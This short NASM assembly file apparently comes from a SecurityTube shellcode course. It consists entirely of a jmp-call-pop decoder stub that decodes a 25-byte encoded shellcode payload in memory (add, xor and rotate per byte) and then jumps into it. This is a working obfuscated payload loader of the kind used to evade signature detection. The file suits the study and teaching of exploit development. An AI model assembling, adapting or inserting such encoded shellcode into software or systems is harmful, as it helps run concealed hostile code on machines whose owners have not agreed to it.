; Filename: not-encoder.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25

decode:
	xor ebx, ebx
	mov byte bl, [esi]
	;;; Decoding ;;;
	add bl, 7
	xor bl,0xe0
	rol bl, 1
	;;; Decoding ;;;
	mov byte [esi], bl
	inc esi
	loop decode
	jmp short EncodedShellcode

call_shellcode:
	call decoder
	EncodedShellcode: db 0x71,0x79,0xc1,0xcd,0x70,0x70,0x52,0xcd,0xcd,0x70,0xca,0x4d,0xd0,0x1d,0x0a,0xc1,0x1d,0x8a,0x42,0x1d,0x09,0xb1,0x5e,0xff,0x99, ; marker2